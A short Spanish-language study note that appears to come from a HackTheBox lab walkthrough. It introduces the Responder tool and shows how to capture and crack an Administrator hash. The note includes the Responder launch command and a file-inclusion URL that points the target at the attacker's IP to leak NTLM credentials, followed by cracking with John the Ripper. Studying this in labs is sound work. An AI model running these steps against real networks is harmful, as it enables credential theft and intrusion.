Es una herramienta la cual  puede responder a las consultas LLMNR y NBT-NS dando su propia dirección IP como destino para cualquier nombre de host solicitado. Se utiliza para la obtención de credenciales de usuario y hashes
```
https://github.com/SpiderLabs/Responder
https://www.securityartwork.es/2015/07/02/una-introduccion-a-responder/
https://jroliva.net/2017/01/30/capturando-credenciales-con-responder-py/
```

# Tutorial Responder
Primero arrancamos la herramienta
```Bash
responder -I tun0
```
![[Pasted image 20240521112327.png]]
![[Pasted image 20240521112217.png]]

Ahora iremos al navegador y al escribir la siguiente ruta obtendriamos los hashes
```
http://unika.htb/index.php?page=//10.10.14.32/somefile
```
![[Pasted image 20240521112119.png]]

Al volver al terminal podremos ver que nos ha proporcionado el hash de Administrador
![[Pasted image 20240521112156.png]]

Una vez capturado el hash se almacenara en la carpeta de logs
![[Pasted image 20240521112718.png]]

Ahora podriamos usar John de ripper para descifrar el hash
```Bash
John archivo.txt
```
![[Pasted image 20240521114136.png]]